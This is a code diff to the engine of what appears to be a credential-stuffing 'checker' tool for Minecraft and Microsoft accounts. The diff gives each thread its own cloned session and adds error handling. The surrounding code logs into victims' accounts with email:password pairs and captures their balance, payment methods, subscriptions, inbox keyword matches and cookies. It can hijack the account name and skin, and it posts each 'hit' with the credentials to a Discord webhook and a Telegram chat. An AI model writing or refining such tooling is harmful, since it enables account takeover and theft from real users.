@@ -2,6 +2,7 @@
 checker_engine.py — Core checking engine with CaptureObject and full module orchestration.
 """
 import asyncio
+import html
 import os
 import random
 import threading
@@ -27,6 +28,18 @@ import cookie_saver as cookie_mod
 import auto_ops
 import discord_notifier
 import subscriptions as subs_mod
+
+
+def _clone_session(session):
+    """Create a new Session with cookies/proxies copied from the original.
+    requests.Session is NOT thread-safe, so each capture thread needs its own."""
+    s = requests.Session()
+    s.cookies.update(session.cookies)
+    s.verify = session.verify
+    if session.proxies:
+        s.proxies = dict(session.proxies)
+    s.headers.update(session.headers)
+    return s
 
 
 # ---------------------------------------------------------------------------
@@ -340,13 +353,16 @@ class CheckerEngine:
             capture_obj.cape = 'Unknown'
 
     def _check_namechange(self, capture_obj: CaptureObject) -> None:
+        self._check_namechange_with(capture_obj, capture_obj.session, capture_obj.token)
+
+    def _check_namechange_with(self, capture_obj: CaptureObject, sess, mc_token: str) -> None:
         if not self.config.get('namechange', True):
             return
         try:
             from datetime import datetime, timezone
-            r = capture_obj.session.get(
+            r = sess.get(
                 'https://api.minecraftservices.com/minecraft/profile/namechange',
-                headers={'Authorization': f'Bearer {capture_obj.token}'},
+                headers={'Authorization': f'Bearer {mc_token}'},
                 timeout=10
             )
             if r.status_code == 200:
@@ -534,22 +550,35 @@ class CheckerEngine:
                     pass
 
             # ---- Step 4: Parallel capture threads ----
+            # requests.Session is NOT thread-safe — clone for each thread
             capture_threads = []
+            cloned_sessions = []
 
             def _add_thread(target, *args):
                 t = threading.Thread(target=target, args=args, daemon=True)
                 t.start()
                 capture_threads.append(t)
 
+            def _make_session():
+                cs = _clone_session(session)
+                cloned_sessions.append(cs)
+                return cs
+
             _add_thread(self._fetch_hypixel, capture_obj)
             _add_thread(self._check_optifine, capture_obj)
-            _add_thread(self._check_namechange, capture_obj)
+
+            nc_session = _make_session()
+            capture_obj_nc_token = token
+            def _namechange_check():
+                self._check_namechange_with(capture_obj, nc_session, capture_obj_nc_token)
+            _add_thread(_namechange_check)
 
             if self.config.get('cap_ban_check', True):
+                ban_session = _make_session()
                 _add_thread(
                     ban_mod.check_hypixel_ban,
                     capture_obj, token, capture_obj.name, capture_obj.uuid,
-                    session, [], self.lock, self.results_dir,
+                    ban_session, [], self.lock, self.results_dir,
                     self._write_dedupe_wrapper, self.lock,
                     self.config.get('max_retries', 3), self.config
                 )
@@ -564,27 +593,30 @@ class CheckerEngine:
                 _add_thread(_email_check)
 
             if self.config.get('check_microsoft_balance', False):
+                bal_session = _make_session()
                 def _balance_check():
                     bal = balance_mod.fetch_balance(
-                        session, email, password, self.config,
+                        bal_session, email, password, self.config,
                         self.results_dir, self._write_dedupe_wrapper
                     )
                     capture_obj.ms_balance = bal
                 _add_thread(_balance_check)
 
             if self.config.get('check_rewards_points', True):
+                rwd_session = _make_session()
                 def _rewards_check():
                     pts = reward_mod.fetch_rewards(
-                        session, email, password, self.config,
+                        rwd_session, email, password, self.config,
                         self.results_dir, self._write_dedupe_wrapper
                     )
                     capture_obj.ms_rewards = pts
                 _add_thread(_rewards_check)
 
             if self.config.get('check_payment', False):
+                pay_session = _make_session()
                 def _payment_check():
                     result = payment_mod.fetch_payment_methods(
-                        session, email, password, self.config,
+                        pay_session, email, password, self.config,
                         self.results_dir, self.lock, self._write_dedupe_wrapper
                     )
                     if result.get('instruments'):
@@ -594,9 +626,10 @@ class CheckerEngine:
                 _add_thread(_payment_check)
 
             if self.config.get('cap_subscriptions', False):
+                sub_session = _make_session()
                 def _subs_check():
                     subs = subs_mod.check_subscriptions(
-                        session, email, password,
+                        sub_session, email, password,
                         self.results_dir, self._write_dedupe_wrapper, self.config
                     )
                     capture_obj.ms_subscriptions = subs
@@ -606,10 +639,11 @@ class CheckerEngine:
                 _add_thread(self._fetch_donut, capture_obj)
 
             if self.config.get('cap_inbox_scan', False):
+                inbox_session = _make_session()
                 def _inbox_check():
                     keywords_str = self.config.get('inbox_keywords', 'Steam,Netflix,Xbox,Microsoft')
                     keywords = [k.strip() for k in keywords_str.split(',') if k.strip()]
-                    matches = inbox_mod.check_inbox(session, email, keywords, self.config)
+                    matches = inbox_mod.check_inbox(inbox_session, email, keywords, self.config)
                     capture_obj.inbox_matches = matches
                     if matches:
                         fmt = ', '.join(f'{k}({v})' for k, v in matches)
@@ -617,41 +651,57 @@ class CheckerEngine:
                                           f'{email}:{password} | Inbox: {fmt}\n')
                 _add_thread(_inbox_check)
 
-            # Wait for ALL capture threads to finish (45s per thread)
+            # Wait for ALL capture threads to finish
             deadline = time.time() + 60
             for t in capture_threads:
                 remaining = max(1, deadline - time.time())
                 t.join(timeout=remaining)
 
-            # ---- Step 5: Auto ops ----
-            if self.config.get('cap_auto_name', False) and capture_obj.name != 'N/A':
-                new_name = auto_ops.setname(
-                    session, token,
-                    self.config.get('auto_name_format', 'Bot_{random_letter}_{random_number}'),
-                    self.config.get('max_retries', 3),
-                    capture_obj.name
-                )
-                if new_name != capture_obj.name:
-                    capture_obj.name = f'{capture_obj.name} -> {new_name}'
+            # Close cloned sessions
+            for cs in cloned_sessions:
+                try:
+                    cs.close()
+                except Exception:
+                    pass
 
-            if self.config.get('cap_auto_skin', False):
-                auto_ops.setskin(
-                    session, token,
-                    self.config.get('auto_skin_url', ''),
-                    self.config.get('auto_skin_variant', 'classic'),
-                    self.config.get('max_retries', 3)
-                )
+            # ---- Step 5: Auto ops ----
+            try:
+                if self.config.get('cap_auto_name', False) and capture_obj.name != 'N/A':
+                    new_name = auto_ops.setname(
+                        session, token,
+                        self.config.get('auto_name_format', 'Bot_{random_letter}_{random_number}'),
+                        self.config.get('max_retries', 3),
+                        capture_obj.name
+                    )
+                    if new_name != capture_obj.name:
+                        capture_obj.name = f'{capture_obj.name} -> {new_name}'
+
+                if self.config.get('cap_auto_skin', False):
+                    auto_ops.setskin(
+                        session, token,
+                        self.config.get('auto_skin_url', ''),
+                        self.config.get('auto_skin_variant', 'classic'),
+                        self.config.get('max_retries', 3)
+                    )
+            except Exception:
+                pass
 
             # ---- Step 6: Cookie saving ----
-            if self.config.get('cap_save_cookies', False):
-                cookie_mod.save_cookies(session, capture_obj.name, capture_obj.type, self.results_dir)
+            try:
+                if self.config.get('cap_save_cookies', False):
+                    cookie_mod.save_cookies(session, capture_obj.name, capture_obj.type, self.results_dir)
+            except Exception:
+                pass
 
             # ---- Step 7: Write result files ----
             self.write_dedupe(self.results_dir, 'hits.txt', capture_obj.hits_line() + '\n')
             self.write_dedupe(self.results_dir, 'Capture.txt', capture_obj.builder())
 
             # ---- Step 8: Discord webhook ----
-            discord_notifier.send_hit_webhook(capture_obj, self.config)
+            try:
+                discord_notifier.send_hit_webhook(capture_obj, self.config)
+            except Exception:
+                pass
 
             # ---- Step 9: Instant Telegram notification ----
             with self.lock:
@@ -659,15 +709,20 @@ class CheckerEngine:
             self.db.update_stats(self.user_id, hits=1)
 
             if self.config.get('hit_notifications', True):
-                hit_line = capture_obj.hits_line()
+                safe_line = html.escape(capture_obj.hits_line())
+                msg_text = f'🎯 <b>HIT!</b>\n<code>{safe_line}</code>\n\nCredits: @akaza_isnt'
+                uid = self.user_id
+                bot_ref = self.bot
+                async def _send_hit_notification():
+                    try:
+                        await bot_ref.send_message(uid, msg_text, parse_mode='HTML')
+                    except Exception:
+                        try:
+                            await bot_ref.send_message(uid, msg_text, parse_mode=None)
+                        except Exception:
+                            pass
                 self.loop.call_soon_threadsafe(
-                    lambda: asyncio.create_task(
-                        self.bot.send_message(
-                            self.user_id,
-                            f'🎯 <b>HIT!</b>\n<code>{hit_line}</code>\n\nCredits: @akaza_isnt',
-                            parse_mode='HTML'
-                        )
-                    )
+                    lambda: asyncio.create_task(_send_hit_notification())
                 )
 
         except Exception as e:
@@ -707,7 +762,8 @@ class CheckerEngine:
             elapsed_since_last = now - self._last_check_time
             if elapsed_since_last < min_gap:
                 wait_time = min_gap - elapsed_since_last
-            self._last_check_time = time.time()
+            # Reserve a unique time slot so the next thread waits past this one
+            self._last_check_time = now + wait_time
         if wait_time > 0:
             time.sleep(wait_time)
 
